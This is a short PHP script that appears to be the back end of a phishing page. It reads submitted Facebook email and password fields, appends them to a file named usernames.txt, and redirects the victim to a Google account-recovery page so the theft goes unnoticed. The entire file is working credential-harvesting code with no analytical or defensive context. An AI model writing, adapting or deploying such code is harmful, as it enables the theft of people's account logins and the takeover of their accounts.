<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['FB_Email'] . " Pass: " . $_POST['FB_Pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
